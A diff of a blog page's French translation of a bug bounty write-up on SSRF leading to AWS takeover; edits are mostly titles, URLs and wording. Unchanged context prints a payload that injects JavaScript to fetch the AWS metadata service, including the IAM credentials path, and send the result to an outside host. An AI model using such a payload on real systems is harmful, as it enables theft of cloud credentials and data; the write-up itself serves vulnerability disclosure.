@@ -11,20 +11,20 @@
     <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://glc.st/images/aws-webservices.png"/>
 
-<meta name="twitter:title" content="AWS takeover through SSRF in JavaScript - Gwendal Le Coguic" />
+<meta name="twitter:title" content="Prise de contrôle AWS via SSRF en JavaScript - Gwendal Le Coguic" />
 <meta name="twitter:description" content="Voici l’histoire d’une faille que j’ai découverte dans un programme de bug bunty privé sur Hackerone. Il m’a fallu exactement 12h30, sans interruption, pour la trouver, l’exploiter et la signaler. …" />
 
 <meta name="twitter:site" content="@Gwendal Le Coguic"/>
 <meta name="twitter:creator" content="@gwendallecoguic"/>
 
-    <meta property="og:title" content="AWS takeover through SSRF in JavaScript - Gwendal Le Coguic" />
+    <meta property="og:title" content="Prise de contrôle AWS via SSRF en JavaScript - Gwendal Le Coguic" />
 <meta property="og:description" content="Voici l’histoire d’une faille que j’ai découverte dans un programme de bug bunty privé sur Hackerone. Il m’a fallu exactement 12h30, sans interruption, pour la trouver, l’exploiter et la signaler. …" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://glc.st/fr/articles/aws-takeover-through-ssrf-in-javascript/" />
+<meta property="og:url" content="https://glc.st/fr/articles/prise-de-controle-aws-via-ssrf-en-javascript/" />
 
 <meta property="og:image" content="https://glc.st/images/aws-webservices.png" />
 <meta property="article:published_time" content="2018-10-02T00:00:00+00:00" />
-<meta property="article:modified_time" content="2026-11-22T10:41:03+01:00" /><meta property="og:locale" content="fr_FR" />
+<meta property="article:modified_time" content="2026-11-22T15:53:13+01:00" /><meta property="og:locale" content="fr_FR" />
 <meta property="og:locale:alternate" content="en_US" /><meta property="og:site_name" content="Gwendal Le Coguic" />
 
 
@@ -32,11 +32,11 @@
       <base href="https://glc.st/">
     
 
-    <title>AWS takeover through SSRF in JavaScript - Gwendal Le Coguic</title>
+    <title>Prise de contrôle AWS via SSRF en JavaScript - Gwendal Le Coguic</title>
 
     
         
-            <link rel="canonical" href="https://glc.st/fr/articles/aws-takeover-through-ssrf-in-javascript/">
+            <link rel="canonical" href="https://glc.st/fr/articles/prise-de-controle-aws-via-ssrf-en-javascript/">
         
     
 
@@ -64,7 +64,7 @@
     <link rel="icon" type="image/png" href="https://glc.st/assets/img/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="https://glc.st/assets/img/favicon-16x16.png" sizes="16x16">
             <link rel="alternate" hreflang="en" href="https://glc.st/posts/aws-takeover-through-ssrf-in-javascript/">
-            <link rel="alternate" hreflang="fr" href="https://glc.st/fr/articles/aws-takeover-through-ssrf-in-javascript/">
+            <link rel="alternate" hreflang="fr" href="https://glc.st/fr/articles/prise-de-controle-aws-via-ssrf-en-javascript/">
             <link rel="alternate" hreflang="x-default" href="https://glc.st/posts/aws-takeover-through-ssrf-in-javascript/"><meta name="generator" content="Hugo 0.147.0">
 
     
@@ -74,7 +74,7 @@
 
 
 
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@id":"https://glc.st/#person"},"dateModified":"2026-11-22","datePublished":"2018-10-02","description":"Voici l\u0026amp;rsquo;histoire d\u0026amp;rsquo;une faille que j\u0026amp;rsquo;ai découverte dans un programme de bug bunty privé sur Hackerone. Il m\u0026amp;rsquo;a fallu exactement …","headline":"AWS takeover through SSRF in JavaScript","image":"https://glc.st/images/aws-webservices.png","inLanguage":"fr","keywords":"bug bounty, aws, ssrf, javascript","publisher":{"@id":"https://glc.st/#person"},"url":"https://glc.st/fr/articles/aws-takeover-through-ssrf-in-javascript/"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@id":"https://glc.st/#person"},"dateModified":"2026-11-22","datePublished":"2018-10-02","description":"Voici l\u0026amp;rsquo;histoire d\u0026amp;rsquo;une faille que j\u0026amp;rsquo;ai découverte dans un programme de bug bunty privé sur Hackerone. Il m\u0026amp;rsquo;a fallu exactement …","headline":"Prise de contrôle AWS via SSRF en JavaScript","image":"https://glc.st/images/aws-webservices.png","inLanguage":"fr","keywords":"bug bounty, aws, ssrf, javascript","publisher":{"@id":"https://glc.st/#person"},"url":"https://glc.st/fr/articles/prise-de-controle-aws-via-ssrf-en-javascript/"}</script>
 
   </head>
 
@@ -165,14 +165,14 @@
 <section class="container post">
     <div id="sharer">
     <div class="sharer-buttons">
-        <a href="https://twitter.com/intent/tweet?text=AWS%20takeover%20through%20SSRF%20in%20JavaScript%20https%3a%2f%2fglc.st%2ffr%2farticles%2faws-takeover-through-ssrf-in-javascript%2f" target="_blank"><img class="twitter" src="https://glc.st/assets/img/share/twitter.svg" alt="twitter"></a>
-        <a href="http://www.reddit.com/submit?url=https%3a%2f%2fglc.st%2ffr%2farticles%2faws-takeover-through-ssrf-in-javascript%2f&title=AWS%20takeover%20through%20SSRF%20in%20JavaScript" target="_blank"><img class="reddit" src="https://glc.st/assets/img/share/reddit.svg" alt="reddit"></a>
-        <a href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fglc.st%2ffr%2farticles%2faws-takeover-through-ssrf-in-javascript%2f&amp;t=AWS%20takeover%20through%20SSRF%20in%20JavaScript" target="_blank"><img class="hackernews" src="https://glc.st/assets/img/share/hackernews.svg" alt="hackernews"></a>
-        <a href="mailto:?subject=AWS%20takeover%20through%20SSRF%20in%20JavaScript&body=https%3a%2f%2fglc.st%2ffr%2farticles%2faws-takeover-through-ssrf-in-javascript%2f" target="_blank"><img class="mail" src="https://glc.st/assets/img/share/mail.svg" alt="mail"></a>
-        <a href="https://wa.me/?text=AWS%20takeover%20through%20SSRF%20in%20JavaScript%20https%3a%2f%2fglc.st%2ffr%2farticles%2faws-takeover-through-ssrf-in-javascript%2f" target="_blank"><img class="whatsapp" src="https://glc.st/assets/img/share/whatsapp.svg" alt="facebook"></a>
-        <a href="https://t.me/share/url?url=https%3a%2f%2fglc.st%2ffr%2farticles%2faws-takeover-through-ssrf-in-javascript%2f&text=AWS%20takeover%20through%20SSRF%20in%20JavaScript" target="_blank"><img class="telegram" src="https://glc.st/assets/img/share/telegram.svg" alt="facebook"></a>
-        <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fglc.st%2ffr%2farticles%2faws-takeover-through-ssrf-in-javascript%2f&amp;title=AWS%20takeover%20through%20SSRF%20in%20JavaScript" target="_blank"><img class="linkedin" src="https://glc.st/assets/img/share/linkedin.svg" alt="linkedin"></a>
-        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fglc.st%2ffr%2farticles%2faws-takeover-through-ssrf-in-javascript%2f&t=AWS%20takeover%20through%20SSRF%20in%20JavaScript" target="_blank"><img class="facebook" src="https://glc.st/assets/img/share/facebook.svg" alt="facebook"></a>
+        <a href="https://twitter.com/intent/tweet?text=Prise%20de%20contr%c3%b4le%20AWS%20via%20SSRF%20en%20JavaScript%20https%3a%2f%2fglc.st%2ffr%2farticles%2fprise-de-controle-aws-via-ssrf-en-javascript%2f" target="_blank"><img class="twitter" src="https://glc.st/assets/img/share/twitter.svg" alt="twitter"></a>
+        <a href="http://www.reddit.com/submit?url=https%3a%2f%2fglc.st%2ffr%2farticles%2fprise-de-controle-aws-via-ssrf-en-javascript%2f&title=Prise%20de%20contr%c3%b4le%20AWS%20via%20SSRF%20en%20JavaScript" target="_blank"><img class="reddit" src="https://glc.st/assets/img/share/reddit.svg" alt="reddit"></a>
+        <a href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fglc.st%2ffr%2farticles%2fprise-de-controle-aws-via-ssrf-en-javascript%2f&amp;t=Prise%20de%20contr%c3%b4le%20AWS%20via%20SSRF%20en%20JavaScript" target="_blank"><img class="hackernews" src="https://glc.st/assets/img/share/hackernews.svg" alt="hackernews"></a>
+        <a href="mailto:?subject=Prise%20de%20contr%c3%b4le%20AWS%20via%20SSRF%20en%20JavaScript&body=https%3a%2f%2fglc.st%2ffr%2farticles%2fprise-de-controle-aws-via-ssrf-en-javascript%2f" target="_blank"><img class="mail" src="https://glc.st/assets/img/share/mail.svg" alt="mail"></a>
+        <a href="https://wa.me/?text=Prise%20de%20contr%c3%b4le%20AWS%20via%20SSRF%20en%20JavaScript%20https%3a%2f%2fglc.st%2ffr%2farticles%2fprise-de-controle-aws-via-ssrf-en-javascript%2f" target="_blank"><img class="whatsapp" src="https://glc.st/assets/img/share/whatsapp.svg" alt="facebook"></a>
+        <a href="https://t.me/share/url?url=https%3a%2f%2fglc.st%2ffr%2farticles%2fprise-de-controle-aws-via-ssrf-en-javascript%2f&text=Prise%20de%20contr%c3%b4le%20AWS%20via%20SSRF%20en%20JavaScript" target="_blank"><img class="telegram" src="https://glc.st/assets/img/share/telegram.svg" alt="facebook"></a>
+        <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fglc.st%2ffr%2farticles%2fprise-de-controle-aws-via-ssrf-en-javascript%2f&amp;title=Prise%20de%20contr%c3%b4le%20AWS%20via%20SSRF%20en%20JavaScript" target="_blank"><img class="linkedin" src="https://glc.st/assets/img/share/linkedin.svg" alt="linkedin"></a>
+        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fglc.st%2ffr%2farticles%2fprise-de-controle-aws-via-ssrf-en-javascript%2f&t=Prise%20de%20contr%c3%b4le%20AWS%20via%20SSRF%20en%20JavaScript" target="_blank"><img class="facebook" src="https://glc.st/assets/img/share/facebook.svg" alt="facebook"></a>
 
         
     </div>
@@ -182,7 +182,7 @@
     <article>
         <header>
             <div class="post-title">
-                <h1 class="title">AWS takeover through SSRF in JavaScript</h1>
+                <h1 class="title">Prise de contrôle AWS via SSRF en JavaScript</h1>
             </div>
             <div class="post-meta">
                 <div class="date">
@@ -194,7 +194,7 @@
                     </span>
                     <span class="reading-time">
                         <i class="fas fa-clock"></i>
-                        8 minutes de lecture
+                        9 minutes de lecture
                     </span>
                 </div>
             </div>
@@ -340,7 +340,7 @@ J&rsquo;ai essayé des payloads XSS classiques et du JavaScript malformé, mais 
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;iframe src=&#34;https://poc.myserver.com&#34;&gt;&#39;</span>;
 </span></span></code></pre></div><p>Mais je n&rsquo;ai toujours rien reçu !!!</p>
 <p>Parfois, il faut tester des trucs stupides soi-même pour se rendre compte à quel point c&rsquo;était stupide&hellip;
-Évidemment, essayer de générer du code HTML était une erreur, mais bon ! Je ne suis qu&rsquo;un hacker&hellip;
+Évidemment, essayer de générer du code HTML était une erreur, mais bon ! Je ne suis qu&rsquo;un bug hunter&hellip;
 Pour en revenir à la requête AJAX, je suis resté bloqué dessus un bon moment.
 Il m&rsquo;a fallu un temps fou pour comprendre comment la faire fonctionner.</p>
 <p>J&rsquo;ai fini par me souvenir qu&rsquo;ArticMonkey utilise ReactJS côté client, et j&rsquo;apprendrais plus tard qu&rsquo;ils utilisent NodeJS côté serveur.</p>
@@ -382,7 +382,7 @@ aussi des serveurs AWS pour son application web (ce qui a été confirmé par l&
 </span></span><span style="display:flex;"><span>...
 </span></span></code></pre></div><p>Payload final:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>{...REDACTED...,&#34;operation&#34;:&#34;Union(&#39;1&#39;;&#39;2;fetch(\&#34;http://169.254.169.254/latest/meta-data/\&#34;).then(res=&gt;res.text()).then((r)=&gt;fetch(\&#34;https://poc.myserver.com/?r=\&#34;+r));&#39;;&#39;3&#39;)&#34;}
-</span></span></code></pre></div><p>N&rsquo;ayant aucune connaissance des métadonnées AWS, puisque c&rsquo;était ma première visite,
+</span></span></code></pre></div><p>N&rsquo;ayant aucune connaissance des métadonnées AWS, puisque c&rsquo;était ma première fois,
 j&rsquo;ai pris le temps d&rsquo;explorer les répertoires et tous les fichiers à ma disposition. Comme vous le lirez partout, le plus intéressant étant <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;ROLE&gt;</code>.</p>
 <p>Ce qui a renvoyé :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
@@ -415,7 +415,7 @@ Cela ne fonctionne pas, le jeton doit également être exporté. Quelle bêtise�
 <p>À gauche : liste des instances EC2 configurées par ArticMonkey. Il s’agit probablement d’une grande partie, voire de la totalité, de leur système.</p>
 <p>À droite : l’entreprise possède 20 buckets contenant des données hautement sensibles de clients, des fichiers statiques pour l’application web et,
 d’après leur nom, probablement des journaux/sauvegardes de ses serveurs.</p>
-<p>Impact : fatal.</p>
+<p>Impact : létal.</p>
 <h2 id="conclusion">Conclusion</h2>
 <p>J&rsquo;ai beaucoup appris grâce à ce bug :</p>
 <ul>
